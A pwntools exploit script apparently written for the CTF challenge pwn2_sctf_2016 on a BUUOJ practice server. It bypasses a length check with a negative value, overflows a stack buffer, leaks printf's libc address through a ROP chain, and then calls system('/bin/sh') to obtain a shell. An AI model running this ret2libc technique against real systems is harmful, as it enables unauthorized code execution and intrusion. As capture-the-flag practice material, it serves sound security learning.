#coding:utf-8
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

# p = process('./pwn2_sctf_2016')
p = remote('node3.buuoj.cn', 28151)
elf = ELF('./pwn2_sctf_2016')

format_str = 0x080486F8
printf_plt = elf.plt['printf']
main_addr = elf.symbols['main']
printf_got = elf.got['printf']

p.recvuntil('read? ')
p.sendline('-1')
p.recvuntil('data!\n')

payload = 'a'*0x30 + p32(printf_plt)+p32(main_addr)+p32(format_str)+p32(printf_got)
p.sendline(payload)

#函数结束前的输出字符串
p.recvuntil('said: ')
#rop执行后输出的字符串，其中有函数地址
p.recvuntil('said: ')

printf_addr = u32(p.recv(4))
libc = LibcSearcher('printf', printf_addr)

libc_base = printf_addr - libc.dump('printf')
sys_addr = libc_base + libc.dump('system')
str_bin = libc_base + libc.dump('str_bin_sh')

p.recvuntil('read? ')
p.sendline('-1')
p.recvuntil('data!\n')
p.sendline('a'*0x30 + p32(sys_addr) + p32(main_addr) + p32(str_bin))
p.interactive()
